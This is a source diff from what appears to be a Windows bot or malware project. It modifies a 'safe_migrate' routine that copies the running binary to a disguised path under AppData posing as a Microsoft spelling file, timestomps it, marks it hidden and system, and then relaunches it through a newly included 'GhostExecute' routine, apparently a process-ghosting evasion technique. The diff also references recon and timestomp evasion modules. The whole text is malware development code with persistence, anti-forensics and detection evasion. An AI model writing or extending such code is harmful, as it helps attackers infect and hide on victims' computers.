@@ -4,6 +4,7 @@
 #include "Modules/recon.h"
 #include "Evasion/timestomp.h"
 #include "Utils/helpers.h"
+#include "Modules/ghost.h"
 #include <cstdio>
 #include <cstring>
 
@@ -57,43 +58,38 @@ void Internal_Persist(const wchar_t* botPath) {
     }
 }
 
-bool safe_migrate(){
+bool safe_migrate() {
     API_TABLE& API = GetAPI();
     wchar_t current_path[MAX_PATH];
     wchar_t target_path[MAX_PATH];
     wchar_t appData[MAX_PATH];
 
-    //get current file location
     API.GetModuleFileNameW(NULL, current_path, MAX_PATH);
-
-    //find appData
     API.GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH);
-
-    //create target path 
     swprintf(target_path, MAX_PATH, L"%ls\\Microsoft\\Spelling\\neutral\\default.exe", appData);
 
-    if(wcscmp(current_path, target_path) == 0){
-        return false;
+    if (wcscmp(current_path, target_path) == 0) {
+        return false;  // migrated
     }
 
-    if(API.CopyFileW(current_path, target_path, FALSE)){
-        
-        //change filetime
+    if (API.CopyFileW(current_path, target_path, FALSE)) {
         timestomp(target_path);
-
         API.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-        
-        //process handoff
-        STARTUPINFOW si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
 
-        if(API.CreateProcessW(target_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)){
-            API.CloseHandle(pi.hProcess);
-            API.CloseHandle(pi.hThread);
+        HANDLE hFile = API.CreateFileW(target_path, GENERIC_READ,
+            FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) return false;
 
-            return true; //success
-        }
+        DWORD fileSize = GetFileSize(hFile, NULL);
+        PVOID buf = API.RtlAllocateHeap(API.GetProcessHeap(), 0, fileSize);
+        DWORD bytesRead = 0;
+        API.ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
+        API.CloseHandle(hFile);
+
+        NTSTATUS status = GhostExecute(buf, (SIZE_T)fileSize);
+        API.RtlFreeHeap(API.GetProcessHeap(), 0, buf);
+
+        return (status == 0);
     }
-
     return false;
 }
